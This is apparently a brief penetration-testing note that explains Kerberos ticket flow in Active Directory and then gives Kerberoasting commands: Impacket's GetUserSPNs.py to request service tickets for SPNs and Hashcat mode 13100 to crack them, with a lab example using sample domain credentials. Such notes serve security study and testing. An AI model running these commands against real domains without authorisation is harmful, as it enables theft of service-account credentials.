### Kerberos

- When a user logs on to Active Directory, the user authenticates to the Domain Controller (DC) using the user’s password which of course the DC knows.
- The DC sends the user a Ticket Granting Ticket (TGT) Kerberos ticket. The TGT is presented to any DC to prove authentication for Kerberos service tickets.
- The user opens up Skype which causes the user’s workstation to lookup the Service Principal Name (SPN) for the user’s Exchange server.
- Once the SPN is identified, the computer communicates with a DC again and presents the user’s TGT as well as the SPN for the resource to which the user needs to communicate.
- The DC replies with the Ticket Granting Service (TGS) Kerberos service ticket.
- The user’s workstation presents the TGS to the Exchange server for access.


![kerberoast](/assets/Kerberos.png)

### How to Kerberoast [simple]

- With access look for the supported SPNs and get TGS ticket for the SPN using GetUserSPNs tool from Impacket

```
GetUserSPNs.py -request -dc-ip <DC_IP> <domain\user>
```

- Crack hash

```
Hashcat -m 13100 <hash_file> <wordlist>
```

#### Grab krb5tgs
```
sudo python3 GetUserSPNs.py BASEJUMP.local/rfeynman:Password -dc-ip $ip -request
```
